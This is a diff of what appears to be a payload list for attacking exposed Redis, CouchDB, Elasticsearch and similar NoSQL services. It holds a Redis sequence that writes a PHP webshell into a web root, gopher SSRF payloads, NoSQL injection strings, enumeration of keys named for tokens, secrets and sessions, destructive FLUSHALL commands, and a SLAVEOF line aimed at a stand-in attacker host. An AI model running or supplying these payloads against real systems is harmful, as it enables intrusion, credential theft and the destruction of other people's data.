@@ -1,48 +1,67 @@
 PING
-SET key value
-GET key
-KEYS *
+INFO
+INFO all
+INFO server
+INFO clients
+INFO memory
+INFO stats
+INFO replication
+INFO cpu
+INFO modules
+INFO errorstats
+INFO keyspace
+CONFIG GET *
+CONFIG GET bind
+CONFIG GET requirepass
+CONFIG GET save
 CONFIG GET dir
-CONFIG SET dir /var/www/html
+CONFIG GET dbfilename
+CONFIG GET maxmemory
+CONFIG SET save ""
+CONFIG SET dir /var/www/html/
 CONFIG SET dbfilename shell.php
-SET webshell "<?php system($_GET['c']); ?>"
-SAVE
-BGSAVE
-SLAVEOF ATTACKER 6379
-CONFIG SET requirepass ""
+CONFIG REWRITE
+KEYS *
+KEYS user:*
+KEYS session:*
+KEYS auth:*
+KEYS admin:*
+KEYS token:*
+KEYS secret:*
+KEYS api:*
+DBSIZE
+SELECT 0
+SELECT 1
+SELECT 15
+FLUSHDB
 FLUSHALL
-DEBUG SLEEP 10
-
-gopher://127.0.0.1:6379/_PING
-gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
-gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%246%0D%0Abackup%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%0A%0A%0D%0A
-
-/_users/_all_docs
-/_users/org.couchdb.user:admin
-/_config/admins/newadmin
-/_all_dbs
-/_session
-/_utils
-
-{"selector": {"$or": [{"_id": {"$gt": ""}}, {"type": "user"}]}}
-{"selector": {"type": "user", "password": {"$regex": "^a"}}}
-
-" OR 1=1
-" AND 1=0 OR 1=1
-* OR 1=1
-admin" OR "1"="1
-
-/_cat/indices?v
-/_cat/nodes?v
-/_cluster/health
-/_nodes/stats
-/_all/_search
-/_search?q=*:*
-/_search?pretty&size=1000
-
-{"FilterExpression": "username = :u OR :u = :u", ":u": {"S": "admin"}}
-
-/.json
-/users.json
-/admin.json
-/config.json?auth=LEAKED_TOKEN
+SLAVEOF ATTACKER_IP 6379
+DEBUG SLEEP 5
+DEBUG JMAP
+DEBUG RELOAD
+DEBUG LOADAOF
+OBJECT ENCODING key
+OBJECT REFCOUNT key
+OBJECT IDLETIME key
+DUMP key
+RESTORE key 0 VALUE
+GET admin
+HGETALL user:1
+HGETALL session:TOKEN
+SMEMBERS admins
+LRANGE users 0 -1
+ZRANGE leaderboard 0 -1
+TYPE username
+http://localhost:5984/
+http://localhost:5984/_all_dbs
+http://localhost:5984/_all_docs
+http://localhost:5984/_users/_all_docs
+http://localhost:5984/_config
+http://localhost:5984/_active_tasks
+http://localhost:5984/_cluster_setup
+http://localhost:5984/_membership
+http://localhost:5984/_session
+http://localhost:5984/_utils
+http://localhost:5984/users/_all_docs?include_docs=true
+http://localhost:5984/_users/_all_docs?include_docs=true
+http://localhost:5984/_users/org.couchdb.user:admin
